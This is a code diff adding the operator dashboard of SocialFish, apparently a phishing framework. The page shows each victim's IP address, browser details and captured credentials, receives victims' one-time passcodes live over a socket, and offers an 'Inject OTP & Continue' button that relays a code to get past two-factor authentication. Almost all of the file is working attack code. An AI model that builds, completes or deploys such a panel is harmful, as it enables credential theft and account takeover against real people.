@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OTP Panel - SocialFish</title>
+    <link rel="stylesheet" href="/static/css/theme.css">
+    <link rel="stylesheet" href="/static/vendor/bootstrap-4.1/bootstrap.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        body { background: #1a1a1a; color: #fff; }
+        .navbar { background: #222; }
+        .panel { background: #2a2a2a; border: 1px solid #444; padding: 20px; border-radius: 8px; margin: 10px 0; }
+        .otp-input { font-size: 2em; text-align: center; letter-spacing: 5px; }
+        .status-waiting { color: #FFB300; }
+        .status-received { color: #4CAF50; }
+        .status-error { color: #f44336; }
+        .otp-code { font-family: monospace; background: #1a1a1a; padding: 10px; border: 1px solid #444; margin: 10px 0; }
+        .victim-info { background: #3a3a3a; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark">
+        <span class="navbar-brand mb-0 h1">SocialFish OTP Live Panel</span>
+        <span id="status" class="status-waiting">🔴 Waiting for OTP...</span>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row">
+            <!-- Left: Victim Info -->
+            <div class="col-md-6">
+                <div class="panel">
+                    <h3>Victim Session</h3>
+                    <div class="victim-info">
+                        <p><strong>Session ID:</strong> <code id="sessionId"></code></p>
+                        <p><strong>Victim IP:</strong> <code id="victimIp"></code></p>
+                        <p><strong>User Agent:</strong> <code id="victimUa" style="word-break: break-all;"></code></p>
+                        <p><strong>Submitted At:</strong> <code id="timestamp"></code></p>
+                    </div>
+                    <h4>Captured Credentials</h4>
+                    <div id="credentials" style="background: #1a1a1a; padding: 10px; border-radius: 5px;"></div>
+                </div>
+            </div>
+
+            <!-- Right: OTP Input -->
+            <div class="col-md-6">
+                <div class="panel">
+                    <h3>OTP Code</h3>
+                    <p id="statusMessage" class="status-waiting">Waiting for victim to receive OTP...</p>
+                    
+                    <div id="receivedOtps">
+                        <!-- Received OTPs will appear here -->
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <label>Or Enter OTP Manually:</label>
+                        <input type="text" class="form-control otp-input" id="manualOtp" placeholder="000000" maxlength="10">
+                        <button class="btn btn-success btn-block mt-3" onclick="injectOtp()">Inject OTP & Continue</button>
+                    </div>
+
+                    <hr>
+                    <div class="text-muted">
+                        <p><small>Waiting for OTP codes to arrive. They will appear above automatically if configured.</small></p>
+                        <p><small>You can also manually paste OTP codes received via other channels.</small></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom: Network Logs -->
+        <div class="panel mt-4">
+            <h3>Network Activity</h3>
+            <div id="networkLogs" style="max-height: 300px; overflow-y: auto; background: #1a1a1a; padding: 10px; border-radius: 5px;">
+                <p class="text-muted">Monitoring network requests...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/vendor/jquery-3.2.1.min.js"></script>
+    <script>
+        // Get session ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session_id') || document.currentScript.getAttribute('data-session-id');
+        const templateId = urlParams.get('template_id');
+
+        // Initialize SocketIO
+        const socket = io();
+
+        // Load session details
+        function loadSessionDetails() {
+            fetch(`/session/${sessionId}`, { headers: { 'Accept': 'application/json' } })
+                .then(r => r.json())
+                .then(data => {
+                    document.getElementById('sessionId').textContent = data.session_hash;
+                    document.getElementById('victimIp').textContent = data.victim_ip;
+                    document.getElementById('victimUa').textContent = data.victim_ua;
+                    document.getElementById('timestamp').textContent = data.timestamp;
+
+                    // Display credentials
+                    const credsDiv = document.getElementById('credentials');
+                    credsDiv.innerHTML = '';
+                    for (const [key, value] of Object.entries(data.credentials)) {
+                        credsDiv.innerHTML += `<p><strong>${key}:</strong> <code>${value}</code></p>`;
+                    }
+                });
+        }
+
+        // Listen for OTP events
+        socket.on('otp_received', (data) => {
+            const otpCode = data.otp_code;
+            const otpsDiv = document.getElementById('receivedOtps');
+            
+            otpsDiv.innerHTML += `
+                <div class="otp-code">
+                    <strong>OTP Received:</strong> ${otpCode}
+                    <button class="btn btn-sm btn-success float-right" onclick="useOtp('${otpCode}')">Use This</button>
+                </div>
+            `;
+
+            document.getElementById('status').className = 'status-received';
+            document.getElementById('status').textContent = '🟢 OTP Received';
+            document.getElementById('statusMessage').className = 'status-received';
+            document.getElementById('statusMessage').textContent = 'OTP received! Inject to continue.';
+        });
+
+        // Listen for network logs
+        socket.on('network_log', (data) => {
+            const logsDiv = document.getElementById('networkLogs');
+            logsDiv.innerHTML += `
+                <p><small><strong>${data.method} ${data.url.substring(0, 50)}</strong> → ${data.status}</small></p>
+            `;
+            logsDiv.scrollTop = logsDiv.scrollHeight;
+        });
+
+        function useOtp(code) {
+            document.getElementById('manualOtp').value = code;
+            injectOtp();
+        }
+
+        function injectOtp() {
+            const otpCode = document.getElementById('manualOtp').value;
+            if (!otpCode) {
+                alert('Enter OTP code first');
+                return;
+            }
+
+            // Emit OTP injection event
+            socket.emit('otp_inject', {
+                session_id: sessionId,
+                otp_code: otpCode
+            });
+
+            // Update UI
+            document.getElementById('status').className = 'status-received';
+            document.getElementById('status').textContent = '✅ OTP Injected';
+            document.getElementById('statusMessage').textContent = 'OTP injected. Continuing flow...';
+
+            // Auto-redirect after a few seconds
+            setTimeout(() => {
+                window.location.href = '/creds';
+            }, 3000);
+        }
+
+        // Load details on page load
+        loadSessionDetails();
+
+        // Subscribe to OTP channel
+        socket.emit('otp_listen', { session_id: sessionId });
+
+        // Auto-refresh session details every 2 seconds
+        setInterval(loadSessionDetails, 2000);
+    </script>
+</body>
+</html>
